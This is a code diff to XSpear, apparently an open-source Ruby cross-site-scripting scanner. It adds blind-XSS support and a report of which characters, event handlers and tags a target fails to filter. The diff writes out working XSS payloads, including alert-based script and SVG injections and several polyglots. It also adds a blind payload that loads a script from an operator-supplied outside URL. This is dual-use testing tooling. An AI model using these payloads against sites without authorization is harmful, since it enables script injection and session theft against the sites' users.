@@ -13,7 +13,7 @@ module XSpear
 end
 
 class XspearScan
-  def initialize(url, data, headers, params, thread, output, verbose)
+  def initialize(url, data, headers, params, thread, output, verbose, blind)
     @url = url
     @data = data
     @headers = headers
@@ -25,7 +25,9 @@ class XspearScan
     @thread = thread
     @output = output
     @verbose = verbose
+    @blind_url = blind
     @report = XspearRepoter.new @url, Time.now
+    @filtered_objects = {}
   end
 
   class ScanCallbackFunc
@@ -55,6 +57,17 @@ class XspearScan
         [true, "reflected #{@query}"]
       else
         [false, "not reflected #{@query}"]
+      end
+    end
+  end
+
+  class CallbackNotAdded < ScanCallbackFunc
+    def run
+      if @response.body.include? @query
+        log("i","reflected #{@query}")
+        [false, true]
+      else
+        [false, false]
       end
     end
   end
@@ -233,36 +246,53 @@ class XspearScan
         'onUnload',
         'onURLFlip'
     ]
+    tags = [
+        "script",
+        "iframe"
+    ]
+    special_chars =[
+        ">",
+        "<",
+        '"',
+        "'",
+        "`",
+        ";",
+        "|",
+        "(",
+        ")",
+        "{",
+        "}",
+        "[",
+        "]",
+        ":",
+        ".",
+        ",",
+        "+",
+        "-",
+        "=",
+        "$"
+    ]
 
     log('s', 'creating a test query.')
     r.push makeQueryPattern('d', 'XsPeaR"', 'XsPeaR"', 'i', "Found SQL Error Pattern", CallbackErrorPatternMatch)
     r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
-    # Check Special Chat
-    r.push makeQueryPattern('f', 'XsPeaR>', 'XsPeaR>', 'i', "not filtered "+">".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', '<XsPeaR', '<XsPeaR', 'i', "not filtered "+"<".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR"', 'XsPeaR"', 'i', "not filtered "+'"'.blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', "XsPeaR'", "XsPeaR'", 'i', "not filtered "+"'".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', "XsPeaR`", "XsPeaR`", 'i', "not filtered "+"`".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR;', 'XsPeaR;', 'i', "not filtered "+";".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR|', 'XsPeaR|', 'i', "not filtered "+"|".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR(', 'XsPeaR(', 'i', "not filtered "+"(".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR)', 'XsPeaR)', 'i', "not filtered "+")".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR{', 'XsPeaR{', 'i', "not filtered "+"{".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR}', 'XsPeaR}', 'i', "not filtered "+"}".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR[', 'XsPeaR[', 'i', "not filtered "+"[".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR]', 'XsPeaR]', 'i', "not filtered "+"]".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR:', 'XsPeaR:', 'i', "not filtered "+":".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR.', 'XsPeaR.', 'i', "not filtered "+".".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR,', 'XsPeaR,', 'i', "not filtered "+",".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR+', 'XsPeaR+', 'i', "not filtered "+"+".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR-', 'XsPeaR-', 'i', "not filtered "+"-".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR=', 'XsPeaR=', 'i', "not filtered "+"=".blue, CallbackStringMatch)
-    r.push makeQueryPattern('f', 'XsPeaR$', 'XsPeaR$', 'i', "not filtered "+"$".blue, CallbackStringMatch)
-    # Check Event Handler
-    r.push makeQueryPattern('f', '<xspear/onhwul=64>', 'onhwul=64', 'i', "not filtered event handler "+"on{any} pattern".blue, CallbackStringMatch)
-    event_handler.each do |ev|
-      r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "not filtered event handler "+"#{ev}=64".blue, CallbackStringMatch)
+    # Check Special Char
+    special_chars.each do |sc|
+      r.push makeQueryPattern('f', "XsPeaR#{sc}>", "XsPeaR#{sc}", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
     end
+
+    # Check Event Handler
+    r.push makeQueryPattern('f', '\"><xspear onhwul=64>', 'onhwul=64', 'i', "not filtered event handler "+"on{any} pattern".blue, CallbackStringMatch)
+    event_handler.each do |ev|
+      r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "not filtered event handler "+"#{ev}=64".blue, CallbackNotAdded)
+    end
+
+    # Check HTML Tag
+    tags.each do |tag|
+      r.push makeQueryPattern('f', "\">xsp<#{tag}>", "xsp<#{tag}>", 'i', "not filtered "+"<#{tag}>".blue, CallbackNotAdded)
+    end
+
+    # Check Common XSS Payloads
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
@@ -273,6 +303,13 @@ class XspearScan
     r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+
+    # Check Blind XSS Payload
+    if !@blind_url.nil?
+      payload = "<script src=#{@blind_url}></script>"
+      r.push makeQueryPattern('f', "\"'>#{payload}", "NOTDETECTED", 'i', "", CallbackNotAdded)
+    end
+
     r = r.flatten
     r = r.flatten
     log('s', "test query generation is complete. [#{r.length} query]")
@@ -291,6 +328,8 @@ class XspearScan
           if result[0]
             log(node[:category], (result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
             @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
+          elsif node[:callback] == CallbackNotAdded
+            @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
           else
             log('d', (result[1]).to_s)
           end
@@ -299,6 +338,8 @@ class XspearScan
         end
       end.each(&:join)
     end
+
+    @report.set_filtered @filtered_objects
     @report.set_endtime
     log('s', "finish scan. the report is being generated..")
     if @output == 'json'
